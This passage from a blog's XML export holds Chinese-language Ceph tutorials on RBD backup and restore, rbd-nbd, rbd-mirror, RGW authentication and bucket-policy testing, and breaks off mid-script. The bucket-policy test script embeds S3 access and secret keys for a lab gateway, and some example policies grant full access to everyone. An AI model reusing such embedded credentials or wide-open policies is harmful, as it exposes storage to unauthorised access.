<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd snap create crbd_cls17_1@s1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd export-diff crbd_cls17_1@s1 ./crbd_base</span></span><br></pre></td></tr></table></figure>

<h2 id="增量"><a href="#增量" class="headerlink" title="增量"></a>增量</h2><p>继续写入一段数据后，再次做快照，并导出增量数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd snap create crbd_cls17_1@s2</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd export-diff crbd_cls17_1@s2 --from-snap s1 ./crbd_s1_s2</span></span><br></pre></td></tr></table></figure>

<p>至此，全量和增量备份数据都以导出到文件<code>crbd_base</code>和<code>crbd_s1_s2</code>两个文件中。</p>
<h1 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h1><h2 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h2><p>将之前导出的增全量备份数据<code>crbd_base</code>、<code>crbd_s1_s2</code>拷贝到需要导入的ceph集群上。创建一个rbd image用于导入备份数据。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd create --image-format 2 --size 1G crbd_cls26_1</span></span><br></pre></td></tr></table></figure>

<h2 id="全量-1"><a href="#全量-1" class="headerlink" title="全量"></a>全量</h2><p>恢复全量数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd import-diff ./crbd_base crbd_cls26_1</span></span><br></pre></td></tr></table></figure>

<h2 id="增量-1"><a href="#增量-1" class="headerlink" title="增量"></a>增量</h2><p>恢复增量数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd import-diff ./crbd_s1_s2 crbd_cls26_1</span></span><br></pre></td></tr></table></figure>

<p>Over!</p>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rbd</tag>
      </tags>
  </entry>
  <entry>
    <title>rbd-nbd分析</title>
    <url>/2016/11/17/storage/ceph/rbd-nbd/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>rbd通过内核的NBD驱动映射成网络设备，用户可以通过读写nbd0…等网络设备，来实现对rbd设备的读写。</p>
<p>优点：</p>
<ul>
<li>nbd设备成功将客户端和rbd隔离开，不再依赖以往的内核rbd驱动；</li>
<li>nbd与librbd的读写在应用层完成，可使用rbd cache提高性能；</li>
<li>rbd的数据保护，可通过ceph命令完成，不需要nbd支持。</li>
</ul>
<p>缺点：</p>
<ul>
<li>要求系统必须支持nbd驱动；</li>
<li>内核nbd与librbd通信，需要通过文件socket通信，增加数据拷贝，会影响性能；</li>
</ul>
<h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p><img src="/images/ceph/rbd-nbd.png" alt="rbd-nbd_frame"></p>
<ul>
<li>客户端直接读写nbd设备（同步）</li>
<li>内核nbd驱动，将客户端的读写信息转化成nbd_request，并通过socket发送给NBDServer（rbd－nbd实现）</li>
<li>NBDServer是守护进程，一个快设备对应一个nbd设备，对应一个守护进程</li>
<li>NBDServer收到内核nbd驱动的nbd_reqeust后，向librbd发起同步读写请求</li>
<li>librbd 向 Ceph集群读写数据</li>
<li>NBDServer接收到librbd同步读写结果后，向内核nbd驱动发送reply</li>
<li>内核nbd驱动收到reply，向客户端return</li>
</ul>
<h1 id="关键数据结构"><a href="#关键数据结构" class="headerlink" title="关键数据结构"></a>关键数据结构</h1><h2 id="Reqeust-Reply"><a href="#Reqeust-Reply" class="headerlink" title="Reqeust &amp; Reply"></a>Reqeust &amp; Reply</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">nbd_request</span> &#123;</span><br><span class="line">    u32 magic;</span><br><span class="line">    u32 type;   <span class="comment">/* == READ || == WRITE */</span></span><br><span class="line">    <span class="type">char</span> handle[<span class="number">8</span>];</span><br><span class="line">    u64 from;</span><br><span class="line">    u32 len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __GNUC__</span></span><br><span class="line">__attribute__ ((packed))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">nbd_reply</span> &#123;</span><br><span class="line">    u32 magic;</span><br><span class="line">    u32 error; <span class="comment">/* 0 = ok, else error */</span></span><br><span class="line">    <span class="type">char</span> handle[<span class="number">8</span>]; <span class="comment">/* handle you got from reqeust */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.codeforge.com/read/47918/nbd.h__html">nbd.h</a></li>
<li><a href="http://lxr.free-electrons.com/source/drivers/block/nbd.c?v=3.6">nbd.c</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rbd</tag>
        <tag>nbd</tag>
      </tags>
  </entry>
  <entry>
    <title>rbd-mirror 跨集群备份</title>
    <url>/2019/05/05/storage/ceph/rbd-mirror/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>Todo…</p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul>
<li>增加了RBD Journal的写入操作，是否会产生写放大现象。</li>
<li>Ceph-RBD-Mirror回放日志的的时间间隔</li>
<li>RBD Journal的容量大小如何配置</li>
<li>RBD Journal存储介质是否可以优化</li>
</ul>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ul>
<li>Ceph版本必须为Jewel及之后版本<br>  RBD-Mirror功能从Jewel版本引入，之前版本不支持该feature。本文以jewel版本为例进行演示。</li>
<li>RBD feature必须包含<code>journaling</code><br>  RBD-Mirror依赖journal完成工作，类似Mysql的主从同步机制。使用日志回放方法备份数据。</li>
</ul>
<h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><ul>
<li><p>准备两个集群分别为cls17和cls26<br>  cls17为primary集群，cls26为non-primary集群，将cls17内的RBD数据备份到cls26集群内</p>
</li>
<li><p>在这两个集群中创建同名pool——<code>rmp</code>（RBD Mirror Pool）</p>
</li>
</ul>
<h4 id="ceph-rbd-mirror服务"><a href="#ceph-rbd-mirror服务" class="headerlink" title="ceph-rbd-mirror服务"></a>ceph-rbd-mirror服务</h4><p>根据RBD-Mirror的原理，需要在non-primery集群上启动<code>ceph-rbd-mirror</code>服务</p>
<p>** 安装 **</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">yum install -y rbd-mirror</span></span><br></pre></td></tr></table></figure>

<p>** 启动 **</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl <span class="built_in">enable</span> ceph-rbd-mirror@admin.service</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl start ceph-rbd-mirror@admin.service</span></span><br></pre></td></tr></table></figure>

<p><code>@admin</code>是ceph中的<code>client.admin</code>用户，只是这里省略了<code>client.</code>。关于Ceph用户管理相关操作可以使用<code>ceph auth</code>命令。</p>
<h4 id="Copy-Config-keyring"><a href="#Copy-Config-keyring" class="headerlink" title="Copy Config &amp; keyring"></a>Copy Config &amp; keyring</h4><p>将cls17集群中的<code>ceph.conf</code>和<code>ceph.client.admin.keyring</code>copy到cls26集群的<code>/etc/ceph</code>目录中，并重命名成<code>cls17.conf</code>和<code>cls17.client.admin.keyring</code>。然后在cls26集群中可通过指定<code>--cluster cls17</code>来指定访问集群。</p>
<h2 id="备份Pool中所有RBD"><a href="#备份Pool中所有RBD" class="headerlink" title="备份Pool中所有RBD"></a>备份Pool中所有RBD</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="Pool-Mirror-Mode"><a href="#Pool-Mirror-Mode" class="headerlink" title="Pool Mirror Mode"></a>Pool Mirror Mode</h4><p>需要将两个集群的的<code>rmp</code>pool的mirror mode设置成<code>pool</code>。</p>
<p>集群cls26</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd mirror pool <span class="built_in">enable</span> rmp pool</span></span><br></pre></td></tr></table></figure>

<p>集群cls17</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd mirror pool <span class="built_in">enable</span> rmp pool --cluster cls17</span></span><br></pre></td></tr></table></figure>

<h4 id="Add-Peer"><a href="#Add-Peer" class="headerlink" title="Add Peer"></a>Add Peer</h4><p>将Primary集群信息加入到<code>rmp</code>pool中。</p>
<p>集群cls26</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd mirror pool peer add rmp client.admin@cls17</span></span><br></pre></td></tr></table></figure>
<p>查看两个集群的peer信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd mirror pool info rmp</span></span><br><span class="line">Mode: pool</span><br><span class="line">Peers:</span><br><span class="line">  UUID                                 NAME  CLIENT</span><br><span class="line">  2c2c1293-0e97-4c57-9bf1-e5f934274758 cls17 client.admin</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">$ rbd mirror pool info rmp --cluster cls17</span></span><br><span class="line">Mode: pool</span><br><span class="line">Peers: none</span><br></pre></td></tr></table></figure>

<p>至此备份Pool中所有RBD的配置操作已经完成，接下来进行验证操作。</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>在集群cls17中<code>rmp</code>pool创建RBD，并查看集群cls26中<code>rmp</code>pool是否有回放操作（RBD是否备份到cls26集群）。由于整个RBD-Mirror依赖于<code>journaling</code>feature，所以创建RBD时需要指定该feature。若对当前<code>rmp</code>pool中存在RBD进行备份，需要先增加<code>jouranling</code>feature，使用<code>rbd feature enable rmp/rd1 journaling</code>命令。</p>
<p>集群cls17</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd create -p rmp --image-format 2 --image-feature layering,exclusive-lock,object-map,fast-diff,deep-flatten,journaling -s 1G rd1</span></span><br></pre></td></tr></table></figure>

<p>集群cls26</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd -p rmp <span class="built_in">ls</span></span></span><br><span class="line">rd1</span><br></pre></td></tr></table></figure>

<h2 id="备份单个RBD"><a href="#备份单个RBD" class="headerlink" title="备份单个RBD"></a>备份单个RBD</h2><h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><h4 id="Pool-Mirror-Mode-1"><a href="#Pool-Mirror-Mode-1" class="headerlink" title="Pool Mirror Mode"></a>Pool Mirror Mode</h4><p>将两个集群的<code>rbd</code>pool的mirror mode设置成<code>image</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd mirror pool <span class="built_in">enable</span> rbd image</span></span><br></pre></td></tr></table></figure>

<h4 id="Add-Peer-1"><a href="#Add-Peer-1" class="headerlink" title="Add Peer"></a>Add Peer</h4><p>将Primary集群信息加入到<code>rbd</code>pool中。具体操作方法，同上。</p>
<h4 id="Enable-Image-Mirror"><a href="#Enable-Image-Mirror" class="headerlink" title="Enable Image Mirror"></a>Enable Image Mirror</h4><p>集群cls17</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd info rd1</span></span><br><span class="line">rbd image &#x27;rd1&#x27;:</span><br><span class="line">    size 1024 MB in 256 objects</span><br><span class="line">    order 22 (4096 kB objects)</span><br><span class="line">    block_name_prefix: rbd_data.ad616b8b4567</span><br><span class="line">    format: 2</span><br><span class="line">    features: exclusive-lock, journaling</span><br><span class="line">    flags:</span><br><span class="line">    journal: ad616b8b4567</span><br><span class="line">    mirroring state: disabled</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd mirror image <span class="built_in">enable</span> rbd/rd1</span></span><br><span class="line">Mirroring enabled</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd info rd1</span></span><br><span class="line">    rbd image &#x27;rd1&#x27;:</span><br><span class="line">    size 1024 MB in 256 objects</span><br><span class="line">    order 22 (4096 kB objects)</span><br><span class="line">    block_name_prefix: rbd_data.ad616b8b4567</span><br><span class="line">    format: 2</span><br><span class="line">    features: exclusive-lock, journaling</span><br><span class="line">    flags:</span><br><span class="line">    journal: ad616b8b4567</span><br><span class="line">    mirroring state: enabled</span><br><span class="line">    mirroring global id: f0c9972d-7585-4bda-a486-baa9a6f96eb5</span><br><span class="line">    mirroring primary: true</span><br></pre></td></tr></table></figure>

<p>集群cls26</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd info rd1</span></span><br><span class="line">rbd image &#x27;rd1&#x27;:</span><br><span class="line">    size 1024 MB in 256 objects</span><br><span class="line">    order 22 (4096 kB objects)</span><br><span class="line">    block_name_prefix: rbd_data.8587327b23c6</span><br><span class="line">    format: 2</span><br><span class="line">    features: exclusive-lock, journaling</span><br><span class="line">    flags:</span><br><span class="line">    journal: 8587327b23c6</span><br><span class="line">    mirroring state: enabled</span><br><span class="line">    mirroring global id: f0c9972d-7585-4bda-a486-baa9a6f96eb5</span><br><span class="line">    mirroring primary: false</span><br></pre></td></tr></table></figure>

<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>(同上)</p>
<p>*** 无论是全Pool备份，还是单个RBD备份，只要建立mirror关系，只有primary rbd才能处理读写操作 ***</p>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rbd</tag>
      </tags>
  </entry>
  <entry>
    <title>rgw auth</title>
    <url>/2019/12/17/storage/ceph/rgw-authorization/</url>
    <content><![CDATA[<p><img src="/images/ceph/radosgw_rgw_auth.png" alt="radosgw_rgw_auth.png"></p>
<p>** 版本 **<br>mimic-13.2.6</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>RGW认证机制中涉及的类分为两类，Strategy类和Engine类。</p>
<h2 id="Strategy-认证策略"><a href="#Strategy-认证策略" class="headerlink" title="Strategy(认证策略)"></a>Strategy(认证策略)</h2><ul>
<li>通过<code>Strategy::add_engine</code>向Strategy注册Engine，注册过程中需要指定<code>Control</code></li>
<li><code>Control</code> 包括<code>REQUISITE</code>、<code>SUFFICIENT</code>、<code>FALLBACK</code><br>  <code>REQUISITE</code> 表示这个Engine是一个必要条件，若一个注册的Engine返回失败，则立即终止Strategy的认证过程，并且不再对其它注册的Engine进行认证;<br>  <code>SUFFICIENT</code> 表示这个Engine是一个充要条件，若一个注册的Engine返回成功，则Strategy完成。然而一个Engine的失败，不会终止整个Strategy，直到所有Engine都返回失败;<br>  <code>FALLBACK</code> 与<code>SUFFICIENT</code>类似，所有注册的Engine返回失败，返回<code>result_t::deny(reason = -EACCES)</code>;<br>  具体可见<code>strategy_handle_rejected</code>、<code>strategy_handle_denied</code>、<code>strategy_handle_granted</code>三个方法。</li>
<li>一个Strategy可以包含多个Strategy和Engine。当验证过程遇到Strategy时，会进行递归调用，直到Engine返回验证结果。</li>
<li>认证的入口为<code>Strategy::apply</code>，由<code>Strategy::apply</code>调用Strategy的<code>authenticate</code>方法开始逐层递归认证。</li>
</ul>
<h2 id="Engine-认证引擎"><a href="#Engine-认证引擎" class="headerlink" title="Engine(认证引擎)"></a>Engine(认证引擎)</h2><ul>
<li>Engine处理具体的认证请求，分为<code>S3AnonymousEngine</code>、<code>LDAPEngine</code>、<code>LocalEngine</code>等</li>
<li>Engine的认证状态包括<code>DENIED</code>、<code>GRANTED</code>、<code>REJECTED</code><br>  <code>DENIED</code> 没有<code>REJECTED</code>那么强烈的认证失败;<br>  <code>GRANTED</code> 认证成功;<br>  <code>REJECTED</code> 认证失败，不需要再尝试其它Engine了;</li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>RGW Bucket Policy</title>
    <url>/2019/10/17/storage/ceph/rgw-bucket-policy/</url>
    <content><![CDATA[<p>Bucket Policy 开启S3数据分享这扇大门。该配置通过S3接口设置到Bucket上，使bucket可对某些用户开放一些访问权限；或拒绝某些用户的一些访问权限。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>Ceph集群版本mimic</li>
<li>RGW版本nautilus</li>
<li>一个Realm中一个master zonegroup</li>
<li>master zonegroup中包含两个zone，exter(master zone)和backup</li>
<li>master zongrroup中包含两个placement，default-placement 和 cold-placement<br>  default-placement 将数据存储于 exter.rgw.buckets.{data, index, non-ec}<br>  cold-placement 将数据存储于 exter.rgw.cold.{data, index, non-ec}</li>
<li>zone exter中创建了4个用户分别属于ours tenant和 默认tenant<br>  默认tenant包括用户，colder 和 admin<br>  ours tenant包括用户，ourone 和 ourtwo</li>
<li>colder 用户使用的 cold-placement，其它用户均使用default-placement</li>
</ul>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>Policy 配置Json Example：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;*&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;arn:aws:s3:::my-cold-bucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;arn:aws:s3:::my-cold-bucket/*&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>** 配置说明：**</p>
<ol>
<li><code>Version</code>可以选择<code>2008-10-17</code>或者<code>2012-10-17</code> AWS就是这样的，没道理讲的。</li>
<li><code>Effect</code>有<code>Allow</code>和<code>Deny</code>两个选项</li>
<li><code>Principal</code>操作主体。eg: “arn:aws:iam::<tenant>:user&#x2F;<uid>“ 该示例有待验证。</li>
<li><code>Action</code>是<code>Allow</code>或<code>Deny</code>得动作</li>
<li><code>Resource</code>被操作得对象</li>
<li><code>Condition</code>使用条件</li>
</ol>
<p>更多配置得内容参见ceph源码<code>src/rgw/rgw_iam_policy_keywords.gperf</code></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>调研同tenant访问配置使用方法和跨tenant访问配置使用方法</p>
<h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><p>用户<code>ours$ourone</code>创建一个叫<code>ouronebucket</code>的bucket，并配置其policy</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:iam::ours:user/ourtwo&quot;</span><span class="punctuation">,</span> <span class="string">&quot;arn:aws:iam:::user/admin&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;arn:aws:s3:::ouronebucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;arn:aws:s3:::ouronebucket/*&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>使用s3cmd工具将policy写入bucket</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">s3cmd setpolicy policy.json s3://ouronebucket</span><br></pre></td></tr></table></figure>

<p>用户<code>colder</code>创建一个叫<code>my-cold-bucket</code>的bucket，并配置其policy</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;*&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:*&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;arn:aws:s3:::my-cold-bucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;arn:aws:s3:::my-cold-bucket/*&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>使用s3cmd工具将policy写入bucket</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">s3cmd setpolicy policy.json s3://my-cold-bucket</span><br></pre></td></tr></table></figure>

<p>** 使用admin用户访问<code>my-cold-bucket</code> **</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">s3cmd -c ./admin.cfg <span class="built_in">ls</span> s3://my-cold-bucket</span></span><br><span class="line">2019-10-17 09:06       207   s3://my-cold-bucket/admin.cfg</span><br><span class="line">2019-10-16 08:40   8478720   s3://my-cold-bucket/tgt.tar</span><br></pre></td></tr></table></figure>
<p>同tenant内正常访问</p>
<p>** 使用admin用户访问<code>ouronebucket</code> **</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">s3cmd -c ./admin.cfg <span class="built_in">ls</span> s3://ouronebucket</span></span><br><span class="line">ERROR: Bucket &#x27;ouronebucket&#x27; does not exist</span><br><span class="line">ERROR: S3 error: 404 (NoSuchBucket)</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">s3cmd -c ./admin.cfg <span class="built_in">ls</span> s3://ours:ouronebucket                                                                                                     12 ↵</span></span><br><span class="line">ERROR: S3 error: 403 (SignatureDoesNotMatch)</span><br></pre></td></tr></table></figure>

<p>** 使用ourtwo用户访问<code>my-cold-bucket</code> **</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">s3cmd -c ./ours_two.cfg <span class="built_in">ls</span> s3://my-cold-bucket                                                                                                     77 ↵</span></span><br><span class="line">ERROR: Bucket &#x27;my-cold-bucket&#x27; does not exist</span><br><span class="line">ERROR: S3 error: 404 (NoSuchBucket)</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">s3cmd -c ./ours_two.cfg <span class="built_in">ls</span> s3://:my-cold-bucket                                                                                                    12 ↵</span></span><br><span class="line">ERROR: S3 error: 403 (SignatureDoesNotMatch)</span><br></pre></td></tr></table></figure>

<p>** 使用ourtwo用户访问<code>ouronebucket</code> **</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">s3cmd -c ./ours_two.cfg <span class="built_in">ls</span> s3://ouronebucket                                                                                                       77 ↵</span></span><br><span class="line">ERROR: Access to bucket &#x27;ouronebucket&#x27; was denied</span><br><span class="line">ERROR: S3 error: 403 (AccessDenied)</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">s3cmd -c ./ours_two.cfg <span class="built_in">ls</span> s3://ours:ouronebucket                                                                                                  77 ↵</span></span><br><span class="line">ERROR: S3 error: 403 (SignatureDoesNotMatch)</span><br></pre></td></tr></table></figure>

<p>** 修改 **<br>将<code>ouronebucket</code>的policy中的<code>Principal</code>改为<code>&#123;&quot;AWS&quot;: [&quot;*&quot;]&#125;,</code>。再试一次</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">s3cmd -c ./ours_two.cfg put ./ours_two.cfg s3://ouronebucket</span></span><br><span class="line">WARNING: Module python-magic is not available. Guessing MIME types based on file extensions.</span><br><span class="line">upload: &#x27;./ours_two.cfg&#x27; -&gt; &#x27;s3://ouronebucket/ours_two.cfg&#x27;  [1 of 1]</span><br><span class="line"> 207 of 207   100% in    0s   356.83 B/s  done</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">s3cmd -c ./ours_two.cfg <span class="built_in">ls</span> s3://ouronebucket</span></span><br><span class="line">2019-10-17 12:01       207   s3://ouronebucket/ours_two.cfg</span><br></pre></td></tr></table></figure>

<p>在网上看到“<a href="https://www.dovefi.com/post/rgw-bucket-policy%E6%9D%83%E9%99%90%E8%AE%BE%E7%BD%AE/">Rgw bucket policy权限设置</a>”这篇文章，里面提到boto3对tenant不支持，于是猜想是不是s3cmd也不支持tenant，遂自己写一个python验证一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> boto</span><br><span class="line"><span class="keyword">import</span> boto.s3.connection</span><br><span class="line"></span><br><span class="line">access_list = [<span class="string">&quot;1CXO01UCDSR1182IUYPL&quot;</span>,<span class="string">&quot;8I4K2USDV5SK3UFLQUB0&quot;</span>]</span><br><span class="line">secret_list = [<span class="string">&quot;Ww0Io3b6fF7dXHQiO9gLo99DZbZAKqfvNO2N7g48&quot;</span>,<span class="string">&quot;A4JuvB468tmnDpmkZMfwesb2zmGZeSiCJlzJMALc&quot;</span>]</span><br><span class="line">bucket_list = [<span class="string">&quot;:my-cold-bucket&quot;</span>,<span class="string">&quot;ours:ouronebucket&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(access_list)):</span><br><span class="line">    access = access_list[i]</span><br><span class="line">    secret = secret_list[i]</span><br><span class="line">    bucket = bucket_list[i]</span><br><span class="line">    conn = boto.connect_s3(aws_access_key_id=access,</span><br><span class="line">                           aws_secret_access_key = secret,</span><br><span class="line">                           host=<span class="string">&#x27;172.30.12.137&#x27;</span>,</span><br><span class="line">                           port=<span class="number">7480</span>,</span><br><span class="line">                           is_secure=<span class="literal">False</span>,</span><br><span class="line">                           calling_format = boto.s3.connection.OrdinaryCallingFormat())</span><br><span class="line">    bkt = conn.get_bucket(bucket)</span><br><span class="line">    <span 